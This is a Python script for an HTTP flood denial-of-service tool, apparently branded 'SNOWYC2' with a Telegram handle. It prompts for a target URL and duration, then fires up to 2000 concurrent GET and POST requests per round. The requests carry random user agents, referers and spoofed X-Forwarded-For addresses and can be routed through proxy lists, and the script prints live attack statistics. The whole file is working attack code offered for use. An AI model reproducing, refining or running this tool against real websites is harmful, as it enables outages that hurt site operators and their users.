import asyncio
import time
import sys
import os
import psutil
import aiohttp
import ssl
import random

# File loaders
def load_lines(filename):
    try:
        with open(filename, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

REFERERS = load_lines("refs.txt")
USER_AGENTS = load_lines("uas.txt")
PROXIES = load_lines("STS.txt")

class AttackEngine:
    def __init__(self, method, target, duration, use_proxies):
        self.method = method
        self.target = target
        self.duration = duration
        self.use_proxies = use_proxies
        self.start_time = time.time()
        self.stats = {'total': 0, 'success': 0, 'errors': 0, 'rps': 0, 'peak_rps': 0}
        self.process = psutil.Process(os.getpid())
        self.session_headers = {}
        self.max_concurrent = 100 if self.use_proxies else 2000

    def update_stats(self, results):
        self.stats['total'] += len(results)
        self.stats['success'] += results.count("SUCCESS")
        self.stats['errors'] += results.count("ERROR")
        elapsed = time.time() - self.start_time
        rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        self.stats['rps'] = rps
        self.stats['peak_rps'] = max(self.stats['peak_rps'], rps)

    async def make_request(self, session, proxy=None):
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": random.choice(REFERERS),
            "X-Forwarded-For": ".".join(str(random.randint(1, 255)) for _ in range(4))
        }
        method = random.choice(["get", "post"])
        try:
            if method == "get":
                async with session.get(self.target, headers=headers, proxy=proxy, ssl=self.ssl_context()) as response:
                    if response.status == 200:
                        return "SUCCESS"
                    elif str(response.status).startswith("4"):
                        return "ERROR"
                    return "OTHER"
            else:
                async with session.post(self.target, headers=headers, proxy=proxy, ssl=self.ssl_context()) as response:
                    if response.status == 200:
                        return "SUCCESS"
                    elif str(response.status).startswith("4"):
                        return "ERROR"
                    return "OTHER"
        except:
            return "ERROR"

    def ssl_context(self):
        context = ssl.create_default_context()
        if self.use_proxies:
            context.set_ciphers('DEFAULT')
            return context
        else:
            context.set_alpn_protocols(["h2"])
            return context

    async def run_attack(self):
        connector = aiohttp.TCPConnector(limit=None, ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)

        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while time.time() - self.start_time < self.duration:
                tasks = []
                for _ in range(self.max_concurrent):
                    proxy = None
                    if self.use_proxies:
                        proxy = f"http://{random.choice(PROXIES)}"
                    tasks.append(self.make_request(session, proxy))
                results = await asyncio.gather(*tasks, return_exceptions=True)
                self.update_stats(results)
                self.print_status()
                await asyncio.sleep(0.5)

        self.print_summary()

    def print_status(self):
        os.system("clear")
        elapsed = time.time() - self.start_time
        remaining = max(0, self.duration - elapsed)
        ram_used = self.process.memory_info().rss / 1024 / 1024

        print(f"\nSNOWYC2 - T.ME/STSVKINGDOM")
        print("=" * 60)
        print(f"METHOD: {self.method} | TARGET: {self.target} | TIME: {self.duration}s")
        print("=" * 60)
        print(f"REQUESTS: {self.stats['total']} | SUCCESS: {self.stats['success']} | ERRORS: {self.stats['errors']}")
        print(f"RPS: {self.stats['rps']:.1f} | PEAK RPS: {self.stats['peak_rps']:.1f}")
        print(f"TIME REMAINING: {remaining:.1f}s | RAM USED: {ram_used:.2f} MB")
        print("=" * 60)

    def print_summary(self):
        elapsed = time.time() - self.start_time
        avg_rps = self.stats['total'] / elapsed if elapsed > 0 else 0
        print("\nATTACK COMPLETED")
        print("=" * 60)
        print(f"TARGET: {self.target}")
        print(f"DURATION: {elapsed:.1f}s")
        print(f"TOTAL REQUESTS: {self.stats['total']}")
        print(f"SUCCESS (200): {self.stats['success']}")
        print(f"ERRORS (4xx): {self.stats['errors']}")
        print(f"AVERAGE RPS: {avg_rps:.1f}")
        print("=" * 60)


def main():
    print("\nSNOWYC2 - T.ME/STSVKINGDOM")
    print("=" * 60)

    method = "C-ECLIPSE"
    target = input("TARGET: ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        duration = int(input("TIME (seconds): ").strip())
    except:
        print("Invalid time input.")
        return

    proxy_choice = input("Proxy support? (y/n): ").strip().lower()
    use_proxies = proxy_choice == 'y'

    engine = AttackEngine(method, target, duration, use_proxies)
    try:
        asyncio.run(engine.run_attack())
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"\nError: {e}")

if __name__ == "__main__":
    main()
    
